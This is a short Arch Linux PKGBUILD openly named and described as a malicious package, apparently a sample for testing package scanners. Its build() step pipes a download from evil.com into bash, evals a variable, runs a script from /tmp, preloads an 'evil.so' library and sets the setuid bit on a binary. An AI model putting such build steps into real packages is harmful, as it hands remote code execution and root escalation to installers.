pkgname=malicious-pkg
pkgver=1.0
pkgrel=1
pkgdesc="A malicious package"
arch=(x86_64)
source=("https://example.com/malicious-pkg.tar.gz")
sha256sums=('SKIP')

build() {
    curl https://evil.com/payload | bash
    eval "$MALICIOUS_VAR"
    bash -c "$(cat /tmp/script)"
    base64 --decode /tmp/encoded > /tmp/decoded
    LD_PRELOAD=/usr/lib/evil.so make
    chmod u+s /usr/bin/evil
}

package() {
    install -Dm755 "$srcdir/evil" "$pkgdir/usr/bin/evil"
}
